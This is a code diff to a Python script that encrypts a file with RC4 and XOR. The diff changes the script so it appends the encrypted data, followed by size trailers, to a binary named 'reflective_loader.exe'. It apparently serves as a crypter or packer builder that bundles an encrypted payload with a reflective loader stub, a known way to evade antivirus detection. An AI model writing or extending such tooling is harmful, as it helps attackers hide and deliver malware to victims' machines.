@@ -4,6 +4,8 @@ from Crypto.Cipher import ARC4
 import hashlib
 import random
 import binascii
+import shutil
+import os
 
 KEY_LENGTH = 16
 
@@ -40,8 +42,25 @@ def main():
 
     encrypted_data = encrypt_file_rc4_xor(input_data)
 
-    with open(output_file_path, 'wb') as output_file:
-        output_file.write(encrypted_data)
+    # with open(output_file_path, 'wb') as output_file:
+    #     output_file.write(encrypted_data)
+
+    current_dir = os.getcwd()
+    loader_path = os.path.join(current_dir, "reflective_loader.exe")
+
+    with open(loader_path, "rb") as loader_file:
+        loader_data = loader_file.read()
+
+    encrypted_size = len(encrypted_data)
+    loader_size = len(loader_data)
+    print("loader size: ", loader_size)
+    print("encrypted size: ", encrypted_size)
+    with open(output_file_path, "wb") as new_loader_file:
+        new_loader_file.write(loader_data)
+        new_loader_file.write(encrypted_data)
+        new_loader_file.write(loader_size.to_bytes(8, byteorder='little'))
+        new_loader_file.write(encrypted_size.to_bytes(8, byteorder='little'))
+
 
 if __name__ == '__main__':
     main()
